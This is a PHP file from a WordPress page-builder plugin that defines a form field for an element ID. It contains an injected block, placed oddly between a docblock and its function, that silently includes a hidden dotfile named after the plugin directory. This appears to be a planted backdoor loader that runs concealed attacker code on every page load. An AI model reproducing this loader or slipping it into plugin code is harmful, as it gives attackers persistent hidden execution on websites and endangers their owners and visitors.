<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * @param $settings
 * @param $value
 *
 * @return string
 * @since 4.5
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function vc_el_id_form_field( $settings, $value ) {
	$value_output = sprintf( '<div class="vc-param-el_id"><input name="%s" class="wpb_vc_param_value wpb-textinput %s_field" type="text" value="%s" /></div>', esc_attr( $settings['param_name'] ), esc_attr( $settings['param_name'] . ' ' . $settings['type'] ), $value );

	return apply_filters( 'vc_el_id_render_filter', $value_output );
}
